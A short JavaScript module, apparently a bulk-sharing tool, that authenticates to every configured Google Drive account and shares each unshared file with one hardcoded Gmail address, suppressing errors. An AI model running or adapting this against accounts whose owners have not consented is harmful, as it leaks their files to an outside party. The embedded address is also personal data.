import Util from "./util.js";
import Drive from "./drive.js";

class Share {
	static async Init() {
		Drive.getAccounts();

		var current = 0;
		var max = 100;

		for (var a = 0; a < Drive.accounts.length; a++) {
			await Drive.authDrive(Drive.accounts[a]);

			await Drive.getDriveInfo();

			var context = this;
			await Drive.iterateDriveFiles(async function(files) {
				for (var i = 0; i < files.length; i++) {
					if (!files[i].shared) {
						try {
							if (current > max) {
								await Drive.shareFile(files[i].id, "jg1453647@gmail.com");

								console.log("shared:", files[i].name);
						
								current -= 1;
							} else {
								Drive.shareFile(files[i].id, "jg1453647@gmail.com").catch(function() {});

								console.log("shared:", files[i].name);

								current += 1;
							}
						} catch {}
					}
				}
			});
		}
	}
}

Share.Init();